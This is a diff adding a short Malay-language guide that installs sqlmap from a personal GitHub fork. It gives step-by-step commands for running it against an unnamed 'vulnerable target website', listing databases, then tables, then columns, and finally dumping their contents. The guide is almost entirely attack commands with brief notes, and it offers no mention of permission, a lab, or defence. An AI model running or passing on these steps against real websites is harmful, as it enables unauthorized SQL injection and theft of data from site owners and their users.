@@ -1,0 +1,35 @@
+apt update 
+
+apt list upgradable -y
+
+apt install git -y
+
+apt install python 
+
+apt install python 2
+
+git clone https://github.com/maellambong/sqlmap.git
+
+cd sqlmap
+
+python2 sqlmap.py -u "target website yang vuln" --random-agent --dbs
+
+
+nanti ada database dia
+
+kemudian pilih database
+
+
+python2 sqlmap.py -u "target website yang vuln" --random-agent -D "ini bubuh database yang di pilih" --tables
+
+nanti ada table database 
+
+python2 sqlmap.py -u "target website yang vuln" --random-agent -D "ini bubuh database yang di pilih" -T "table yang di pilih" --columns 
+
+nanti ada columns database 
+
+python2 sqlmap.py -u "target website yang vuln" --random-agent -D "ini bubuh database yang di pilih" -T "table yang di pilih" -C "columns yang di pilih" --dump
+
+ok clear nanti ada hasil yang di cari
+
+kalau masih tak paham ini video dari youtube cara nak guna mysql https://youtu.be/Bj0S17KT7Xc
